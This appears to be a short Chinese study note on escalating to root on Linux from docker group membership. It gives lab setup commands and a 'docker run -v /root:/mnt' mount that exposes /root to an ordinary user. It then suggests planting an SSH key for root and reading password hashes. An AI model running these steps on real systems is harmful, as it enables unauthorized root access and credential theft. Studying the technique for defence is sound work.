Docker组挂载
条件：普通用户在docker组。

利用docker服务启动镜像挂载目录，从而来访问root目录、etc目录等敏感文件来进行权限提升。
-复现：创建用户归类目录，添加到docker组
```
useradd -d /home/test -m  test
passwd test
usermod -G docker test
newgrp docker

groups test
su test
id
在docker组的用户才有运行docker
```
-利用：
```
docker run -v /root:/mnt -it alpine
主要的作用是：从Docker上面下载alpine镜像，然后运行;
-v将容器外部的目录/root挂载到容器内部/mnt，使用-it参数进入容器shell。
docker -it exec xxxx
cat /mnt
```
个人理解就是普通用户test通过docker挂载把/root目录挂载到了容器内部，其本来是不能访问/root目录的，
现在可以通过访问容器内部挂载的目录实现越权，并能实现创建、修改等操作。
上传root的ssh公钥，查看root密文。